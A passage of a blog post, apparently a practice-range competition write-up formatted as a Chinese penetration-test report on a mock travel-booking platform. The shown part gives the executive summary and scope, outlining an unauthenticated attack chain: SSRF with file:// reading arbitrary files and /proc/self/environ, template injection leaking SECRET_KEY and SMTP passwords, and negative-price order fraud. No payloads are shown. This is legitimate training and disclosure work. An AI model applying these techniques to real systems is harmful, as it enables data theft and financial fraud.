@@ -1,0 +1,2024 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="渗透测试报告 Penetration Testing Report\n项目名称 你重生为了一个安全服务工程师 —— 旅游景点预订平台靶场实战 报告版本 V3.0 报告日期 2026年8月30日 密级 公开（博客发表版） 文档修订记录 版本号 修订日期 修订人 修订内容 V1.0 2026-08-29 Chen_Ovo 业务越权漏洞 V2.0 2026-08-29 Chen_Ovo 新添漏洞 V3.0 2026-08-30 Chen_Ovo SSRF / SSTI 深度利用与完整攻击链复盘，共确认 13 项漏洞 一、执行摘要 本报告为【A公司安全部门】委托【安全服务工程师】对其指定的旅游景点预订平台（好靶场演练环境）进行安全渗透测试的成果报告。本次渗透测试旨在通过模拟攻击者的视角，对目标系统进行全面的安全评估，发现潜在的安全漏洞和风险隐患，并提出相应的修复建议。\n">
+<title>好靶场8.29月赛wp</title>
+
+<link rel='canonical' href='https://blog.xxchenchen.top/p/%E5%A5%BD%E9%9D%B6%E5%9C%BA8.29%E6%9C%88%E8%B5%9Bwp/'>
+
+<link rel="stylesheet" href="/scss/style.min.914b352bb0343d4714b9507219bb145181391434a988105253d8b4f52c3ec246.css"><meta property='og:title' content="好靶场8.29月赛wp">
+<meta property='og:description' content="渗透测试报告 Penetration Testing Report\n项目名称 你重生为了一个安全服务工程师 —— 旅游景点预订平台靶场实战 报告版本 V3.0 报告日期 2026年8月30日 密级 公开（博客发表版） 文档修订记录 版本号 修订日期 修订人 修订内容 V1.0 2026-08-29 Chen_Ovo 业务越权漏洞 V2.0 2026-08-29 Chen_Ovo 新添漏洞 V3.0 2026-08-30 Chen_Ovo SSRF / SSTI 深度利用与完整攻击链复盘，共确认 13 项漏洞 一、执行摘要 本报告为【A公司安全部门】委托【安全服务工程师】对其指定的旅游景点预订平台（好靶场演练环境）进行安全渗透测试的成果报告。本次渗透测试旨在通过模拟攻击者的视角，对目标系统进行全面的安全评估，发现潜在的安全漏洞和风险隐患，并提出相应的修复建议。\n">
+<meta property='og:url' content='https://blog.xxchenchen.top/p/%E5%A5%BD%E9%9D%B6%E5%9C%BA8.29%E6%9C%88%E8%B5%9Bwp/'>
+<meta property='og:site_name' content='ChenOvo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='wp' /><meta property='article:tag' content='渗透' /><meta property='article:published_time' content='2026-08-31T08:24:44&#43;08:00'/><meta property='article:modified_time' content='2026-08-31T08:24:44&#43;08:00'/>
+<meta name="twitter:title" content="好靶场8.29月赛wp">
+<meta name="twitter:description" content="渗透测试报告 Penetration Testing Report\n项目名称 你重生为了一个安全服务工程师 —— 旅游景点预订平台靶场实战 报告版本 V3.0 报告日期 2026年8月30日 密级 公开（博客发表版） 文档修订记录 版本号 修订日期 修订人 修订内容 V1.0 2026-08-29 Chen_Ovo 业务越权漏洞 V2.0 2026-08-29 Chen_Ovo 新添漏洞 V3.0 2026-08-30 Chen_Ovo SSRF / SSTI 深度利用与完整攻击链复盘，共确认 13 项漏洞 一、执行摘要 本报告为【A公司安全部门】委托【安全服务工程师】对其指定的旅游景点预订平台（好靶场演练环境）进行安全渗透测试的成果报告。本次渗透测试旨在通过模拟攻击者的视角，对目标系统进行全面的安全评估，发现潜在的安全漏洞和风险隐患，并提出相应的修复建议。\n">
+    <link rel="shortcut icon" href="/favicon.png" />
+<link rel="stylesheet" href='/css/custom.css?v=1788137079'>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_7a0b096c17d58c3c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">ChenOvo</a></h1>
+            <h2 class="site-description">游手好闲的一天</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/xxchen-yu'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>blog</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/wiki/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-wiki" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M4 5h5a3 3 0 0 1 3 3v11a3 3 0 0 0 -3 -3h-5z" />
+  <path d="M20 5h-5a3 3 0 0 0 -3 3v11a3 3 0 0 1 3 -3h5z" />
+  <path d="M8 9h1" />
+  <path d="M8 12h1" />
+  <path d="M15 9h1" />
+  <path d="M15 12h1" />
+</svg>
+
+                
+                <span>Wiki</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc collapsible-toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#文档修订记录">文档修订记录</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#11-测试概况">1.1 测试概况</a></li>
+    <li><a href="#12-总体风险评级">1.2 总体风险评级</a></li>
+    <li><a href="#13-总体评价">1.3 总体评价</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#21-测试目的">2.1 测试目的</a></li>
+    <li><a href="#22-测试范围">2.2 测试范围</a></li>
+    <li><a href="#23-测试方法">2.3 测试方法</a></li>
+    <li><a href="#24-测试限制">2.4 测试限制</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#41-漏洞统计">4.1 漏洞统计</a></li>
+    <li><a href="#42-漏洞清单">4.2 漏洞清单</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#vuln-001-未授权ssrf导致任意文件读取">VULN-001 未授权SSRF导致任意文件读取</a></li>
+    <li><a href="#vuln-002-未授权ssti服务端模板注入导致全量配置泄露">VULN-002 未授权SSTI服务端模板注入导致全量配置泄露</a></li>
+    <li><a href="#vuln-003-负数价格订单反向充值刷余额">VULN-003 负数价格订单反向充值刷余额</a></li>
+    <li><a href="#vuln-004-任意价格篡改与零元购">VULN-004 任意价格篡改与零元购</a></li>
+    <li><a href="#vuln-005-库存校验绕过超卖">VULN-005 库存校验绕过（超卖）</a></li>
+    <li><a href="#vuln-006-生产环境debug模式开启">VULN-006 生产环境DEBUG模式开启</a></li>
+    <li><a href="#vuln-007-cors任意源反射叠加凭证传递">VULN-007 CORS任意源反射叠加凭证传递</a></li>
+    <li><a href="#vuln-008-smtp邮箱凭据泄露">VULN-008 SMTP邮箱凭据泄露</a></li>
+    <li><a href="#vuln-009-邮箱轰炸验证码无频率限制">VULN-009 邮箱轰炸（验证码无频率限制）</a></li>
+    <li><a href="#vuln-010-验证码与登录口令无限暴力破解">VULN-010 验证码与登录口令无限暴力破解</a></li>
+    <li><a href="#vuln-011-登录接口用户名枚举">VULN-011 登录接口用户名枚举</a></li>
+    <li><a href="#vuln-012-并发支付竞态条件">VULN-012 并发支付竞态条件</a></li>
+    <li><a href="#vuln-013-过期日期仍可下单">VULN-013 过期日期仍可下单</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#61-修复优先级清单">6.1 修复优先级清单</a></li>
+    <li><a href="#62-重点修复方案说明">6.2 重点修复方案说明</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#71-测试工具列表">7.1 测试工具列表</a></li>
+    <li><a href="#72-参考标准">7.2 参考标准</a></li>
+    <li><a href="#73-免责声明">7.3 免责声明</a></li>
+    <li><a href="#74-联系方式">7.4 联系方式</a></li>
+    <li><a href="#75-测试期间涉及的账号与凭据存档">7.5 测试期间涉及的账号与凭据（存档）</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+    <style>
+     
+    .collapsible-toc nav > ol > li {
+        position: relative;
+        margin: 6px 0;
+        list-style: none;
+    }
+
+    .collapsible-toc nav > ol > li > a {
+        display: inline-flex;
+        align-items: center;
+    }
+
+     
+    .collapsible-toc nav > ol > li > a::after {
+        content: '▶';
+        margin-left: 6px;
+        font-size: 10px;
+        opacity: 0.5;
+        transition: transform 0.2s ease, opacity 0.2s ease;
+    }
+
+    .collapsible-toc nav > ol > li:hover > a::after {
+        transform: rotate(90deg);
+        opacity: 1;
+    }
+
+     
+    .collapsible-toc nav > ol > li > ol {
+        max-height: 0;
+        overflow: hidden;
+        opacity: 0;
+        margin-left: 16px;
+        transition: max-height 0.3s ease, opacity 0.3s ease;
+    }
+
+     
+    .collapsible-toc nav > ol > li:hover > ol {
+        max-height: 2000px;
+        opacity: 1;
+    }
+
+     
+    .collapsible-toc nav > ol > li > ol > li {
+        list-style: none;
+        margin: 4px 0;
+    }
+
+     
+    .collapsible-toc nav > ol > li:not(:has(> ol)) > a::after {
+        display: none;
+    }
+    </style>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+                <nav class="desktop-top-nav" aria-label="Primary">
+        <div class="desktop-top-nav__inner">
+            <a class="desktop-top-nav__brand" href="/" aria-label="ChenOvo"><img src="/img/avatar_hu_530b2b16f6a7682f.png" width="32" height="32" class="desktop-top-nav__avatar" loading="lazy" alt=""><span class="desktop-top-nav__title">ChenOvo</span>
+            </a>
+
+            <ol class="desktop-top-nav__list">
+            
+                
+                <li class="desktop-top-nav__item">
+                    <a href='/' >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                        
+                        <span>主页</span>
+                    </a>
+                </li>
+            
+                
+                <li class="desktop-top-nav__item">
+                    <a href='/%E5%85%B3%E4%BA%8E/' >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                        
+                        <span>关于</span>
+                    </a>
+                </li>
+            
+                
+                <li class="desktop-top-nav__item">
+                    <a href='/archives/' >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                        
+                        <span>blog</span>
+                    </a>
+                </li>
+            
+                
+                <li class="desktop-top-nav__item">
+                    <a href='/search/' >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                        
+                        <span>Search</span>
+                    </a>
+                </li>
+            
+                
+                <li class="desktop-top-nav__item">
+                    <a href='/links/' >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                        <span>Links</span>
+                    </a>
+                </li>
+            
+                
+                <li class="desktop-top-nav__item">
+                    <a href='/wiki/' >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-wiki" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M4 5h5a3 3 0 0 1 3 3v11a3 3 0 0 0 -3 -3h-5z" />
+  <path d="M20 5h-5a3 3 0 0 0 -3 3v11a3 3 0 0 1 3 -3h5z" />
+  <path d="M8 9h1" />
+  <path d="M8 12h1" />
+  <path d="M15 9h1" />
+  <path d="M15 12h1" />
+</svg>
+
+                        
+                        <span>Wiki</span>
+                    </a>
+                </li>
+            
+            </ol><form action="/search/" class="desktop-top-nav__search" role="search">
+                    <label for="desktop-top-nav-search">搜索</label>
+                    <input id="desktop-top-nav-search" name="keyword" required placeholder="输入关键词..." />
+                    <button type="submit" title="搜索" aria-label="搜索">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                    </button>
+                </form></div>
+    </nav>
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%AF%94%E8%B5%9B/" >
+                比赛
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E5%A5%BD%E9%9D%B6%E5%9C%BA8.29%E6%9C%88%E8%B5%9Bwp/">好靶场8.29月赛wp</a>
+        </h2>
+
+        
+    </div>
+
+    
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2026-08-31T08:24:44&#43;08:00'>Aug 31, 2026</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 19 分钟
+                </time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                <span class="article-time--wordcount">9120 字</span>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="渗透测试报告">渗透测试报告
+</h1><blockquote>
+<p><strong>Penetration Testing Report</strong></p>
+</blockquote>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>项目名称</th>
+					<th>你重生为了一个安全服务工程师 —— 旅游景点预订平台靶场实战</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>报告版本</td>
+					<td>V3.0</td>
+			</tr>
+			<tr>
+					<td>报告日期</td>
+					<td>2026年8月30日</td>
+			</tr>
+			<tr>
+					<td>密级</td>
+					<td>公开（博客发表版）</td>
+			</tr>
+	</tbody>
+</table></div>
+<hr>
+<h2 id="文档修订记录">文档修订记录
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>版本号</th>
+					<th>修订日期</th>
+					<th>修订人</th>
+					<th>修订内容</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>V1.0</td>
+					<td>2026-08-29</td>
+					<td>Chen_Ovo</td>
+					<td>业务越权漏洞</td>
+			</tr>
+			<tr>
+					<td>V2.0</td>
+					<td>2026-08-29</td>
+					<td>Chen_Ovo</td>
+					<td>新添漏洞</td>
+			</tr>
+			<tr>
+					<td>V3.0</td>
+					<td>2026-08-30</td>
+					<td>Chen_Ovo</td>
+					<td>SSRF / SSTI 深度利用与完整攻击链复盘，共确认 13 项漏洞</td>
+			</tr>
+	</tbody>
+</table></div>
+<hr>
+<h1 id="一执行摘要">一、执行摘要
+</h1><p>本报告为【A公司安全部门】委托【安全服务工程师】对其指定的旅游景点预订平台（好靶场演练环境）进行安全渗透测试的成果报告。本次渗透测试旨在通过模拟攻击者的视角，对目标系统进行全面的安全评估，发现潜在的安全漏洞和风险隐患，并提出相应的修复建议。</p>
+<h2 id="11-测试概况">1.1 测试概况
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>项目</th>
+					<th>内容</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>测试目标</td>
+					<td>hbc2.haobachang.com:30589（旅游景点预订平台）</td>
+			</tr>
+			<tr>
+					<td>测试时间</td>
+					<td>2026年8月30日</td>
+			</tr>
+			<tr>
+					<td>测试类型</td>
+					<td>✔黑盒起步　□白盒测试　✔灰盒深入（利用信息泄露拿到源码后）</td>
+			</tr>
+			<tr>
+					<td>测试方法</td>
+					<td>□手动测试　□自动化扫描　✔混合测试</td>
+			</tr>
+			<tr>
+					<td>测试人员</td>
+					<td>Chen_Ovo</td>
+			</tr>
+	</tbody>
+</table></div>
+<h2 id="12-总体风险评级">1.2 总体风险评级
+</h2><p><strong>根据本次渗透测试结果，目标系统的总体安全风险评级如下：</strong></p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>风险等级</th>
+					<th>数量</th>
+					<th>说明</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>严重</td>
+					<td>4</td>
+					<td>攻击者<strong>无需任何认证</strong>即可读取服务器任意文件、倾倒全部敏感配置，或以负数价格订单反向充值直接刷余额</td>
+			</tr>
+			<tr>
+					<td>高危</td>
+					<td>4</td>
+					<td>攻击者可绕过库存限制超卖、获取生产环境完整配置、跨域窃取用户数据、获得SMTP邮箱凭据</td>
+			</tr>
+			<tr>
+					<td>中危</td>
+					<td>5</td>
+					<td>可能对系统造成一定影响或泄露部分信息（邮箱轰炸、暴力破解、用户名枚举、支付竞态、过期日期下单）</td>
+			</tr>
+			<tr>
+					<td>低危</td>
+					<td>0</td>
+					<td>影响有限，建议修复以增强安全防护</td>
+			</tr>
+	</tbody>
+</table></div>
+<h2 id="13-总体评价">1.3 总体评价
+</h2><p>目标系统的整体安全状况<strong>不容乐观</strong>，属于缺陷密度较高的业务系统。本次测试从黑盒起手，仅通过前端 JS 资产分析就发现了两个前端代码中完全未被调用、残留在线上的调试接口（图片导入、模板预览），而这恰恰是全站危害最大的两处漏洞的入口：<code>import-image</code> 可用 <code>file://</code> 协议读取服务器任意文件（服务以 root 运行），<code>review-template-preview</code> 可注入 Django 模板语法直接读出 <code>SECRET_KEY</code> 与 SMTP 邮箱密码明文。整条攻击链<strong>不需要登录、不需要特殊工具、不触发告警</strong>，最终从 <code>/proc/self/environ</code> 中直接拿到了环境变量里的挑战旗标（flag）。</p>
+<p>在资金安全方面，订单金额完全由客户端提交、服务端不做强制重算，负数价格反向充值、0.01 元购买 280 元门票、零元购均可被任意普通用户利用。测试期间，演练账户余额已被从 2000.00 元刷至 2479.99 元，完整验证了攻击路径的可行性。此外，生产环境 <code>DEBUG=True</code>、CORS 任意源反射叠加凭证传递、验证码接口无频率限制等配置与设计类问题进一步放大了攻击面。</p>
+<p>综合来看，建议立即按照第六章的优先级清单启动修复（P0 项应在 24～48 小时内处理），并对已泄露的 <code>SECRET_KEY</code> 与 SMTP 邮箱密码执行轮换。</p>
+<hr>
+<h1 id="二测试概述">二、测试概述
+</h1><h2 id="21-测试目的">2.1 测试目的
+</h2><p>本次渗透测试的主要目的包括：</p>
+<ul>
+<li>评估目标系统的安全防护能力，发现潜在的安全漏洞；</li>
+<li>验证现有安全防护措施的有效性；</li>
+<li>为系统安全加固提供依据和改进建议；</li>
+<li>满足合规性要求，提升整体安全水平。</li>
+</ul>
+<h2 id="22-测试范围">2.2 测试范围
+</h2><p><strong>本次渗透测试的范围如下表所示：</strong></p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>项目</th>
+					<th>内容</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>目标系统</td>
+					<td>旅游景点预订平台（Vue.js + Django + DRF + SQLite）</td>
+			</tr>
+			<tr>
+					<td>IP地址/域名</td>
+					<td>hbc2.haobachang.com</td>
+			</tr>
+			<tr>
+					<td>测试URL</td>
